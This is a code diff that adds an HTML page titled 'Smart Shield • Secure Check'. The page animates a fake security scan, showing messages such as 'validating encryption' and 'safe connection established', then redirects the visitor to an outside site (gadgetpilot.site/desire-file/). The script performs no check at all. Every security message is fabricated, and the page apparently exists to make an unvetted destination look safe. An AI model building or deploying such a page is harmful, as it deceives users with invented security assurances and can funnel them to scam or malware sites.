@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>🌈 Smart Shield • Secure Check</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:'Poppins',sans-serif;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  color:#fff;
+  background:linear-gradient(-45deg,#ff0080,#7928ca,#007cf0,#00dfd8);
+  background-size:400% 400%;
+  animation:bgMove 12s ease infinite;
+}
+
+/* animated background */
+@keyframes bgMove{
+  0%{background-position:0% 50%;}
+  50%{background-position:100% 50%;}
+  100%{background-position:0% 50%;}
+}
+
+/* floating circles */
+.circle{
+  position:absolute;
+  border-radius:50%;
+  filter:blur(40px);
+  opacity:0.5;
+  animation:float 10s infinite alternate;
+}
+
+.circle:nth-child(1){
+  width:300px;
+  height:300px;
+  background:#ff4ecd;
+  top:5%;
+  left:10%;
+}
+
+.circle:nth-child(2){
+  width:250px;
+  height:250px;
+  background:#00e0ff;
+  bottom:10%;
+  right:10%;
+}
+
+.circle:nth-child(3){
+  width:200px;
+  height:200px;
+  background:#ffe600;
+  bottom:20%;
+  left:20%;
+}
+
+@keyframes float{
+  to{
+    transform:translateY(40px) translateX(20px) scale(1.1);
+  }
+}
+
+/* glass card */
+.box{
+  width:400px;
+  padding:2.2rem;
+  text-align:center;
+  border-radius:25px;
+  background:rgba(255,255,255,0.12);
+  backdrop-filter:blur(18px);
+  border:1px solid rgba(255,255,255,0.2);
+  box-shadow:0 10px 50px rgba(0,0,0,0.4);
+  position:relative;
+  z-index:2;
+}
+
+/* title */
+h1{
+  font-size:2rem;
+  margin-bottom:0.3rem;
+  font-weight:700;
+}
+
+.sub{
+  color:#f1f5f9;
+  font-size:0.9rem;
+  margin-bottom:1.8rem;
+}
+
+/* progress bar */
+.bar{
+  width:100%;
+  height:14px;
+  background:rgba(255,255,255,0.15);
+  border-radius:30px;
+  overflow:hidden;
+  margin-bottom:1.2rem;
+}
+
+.fill{
+  width:0%;
+  height:100%;
+  border-radius:30px;
+  background:linear-gradient(90deg,#ffea00,#00ffcc,#ff00ff);
+  box-shadow:0 0 20px rgba(255,255,255,0.5);
+  transition:0.25s;
+}
+
+/* percentage */
+.percent{
+  font-size:2.4rem;
+  font-weight:700;
+  margin-bottom:0.6rem;
+  text-shadow:0 0 12px rgba(255,255,255,0.6);
+}
+
+/* message */
+.msg{
+  font-size:1rem;
+  margin-bottom:1rem;
+}
+
+/* badge */
+.badge{
+  display:inline-block;
+  padding:8px 18px;
+  border-radius:30px;
+  background:rgba(255,255,255,0.15);
+  font-size:0.85rem;
+  border:1px solid rgba(255,255,255,0.2);
+  backdrop-filter:blur(10px);
+}
+
+/* loading dots */
+.dots::after{
+  content:'';
+  animation:dots 1.2s infinite;
+}
+
+@keyframes dots{
+  0%{content:'';}
+  33%{content:'.';}
+  66%{content:'..';}
+  100%{content:'...';}
+}
+</style>
+</head>
+
+<body>
+
+<div class="circle"></div>
+<div class="circle"></div>
+<div class="circle"></div>
+
+<div class="box">
+
+  <h1>🌈 Smart Shield</h1>
+  <div class="sub">AI-powered colorful secure check</div>
+
+  <div class="bar">
+    <div class="fill" id="fill"></div>
+  </div>
+
+  <div class="percent" id="percent">0%</div>
+
+  <div class="msg dots" id="msg">
+    🔍 analyzing request
+  </div>
+
+  <div class="badge" id="badge">
+    🛡️ initializing
+  </div>
+
+</div>
+
+<script>
+
+let p = 0;
+
+const fill = document.getElementById("fill");
+const percent = document.getElementById("percent");
+const msg = document.getElementById("msg");
+const badge = document.getElementById("badge");
+
+const steps = [
+  ["🔍 analyzing request", "📡 scanning"],
+  ["🔐 validating encryption", "🔑 verifying"],
+  ["⚡ syncing secure nodes", "🌐 routing"],
+  ["🛡️ applying protection", "🧠 securing"],
+  ["✅ safe connection established", "✔ secure"],
+  ["🚀 preparing access", "⚙ finalizing"],
+  ["✨ redirecting now", "➡ redirect"]
+];
+
+function run(){
+
+  p += Math.random() * 7;
+
+  if(p >= 100){
+
+    p = 100;
+
+    percent.textContent = "100%";
+    fill.style.width = "100%";
+
+    msg.textContent = "✨ redirecting...";
+    badge.textContent = "🚀 done";
+
+    setTimeout(()=>{
+
+      window.location.href = "https://gadgetpilot.site/desire-file/";
+
+    },1200);
+
+    return;
+  }
+
+  percent.textContent = Math.floor(p) + "%";
+
+  fill.style.width = p + "%";
+
+  let i = Math.floor((p / 100) * steps.length);
+
+  msg.textContent = steps[i][0];
+  badge.textContent = steps[i][1];
+
+  setTimeout(run,150);
+}
+
+run();
+
+</script>
+
+</body>
+</html>
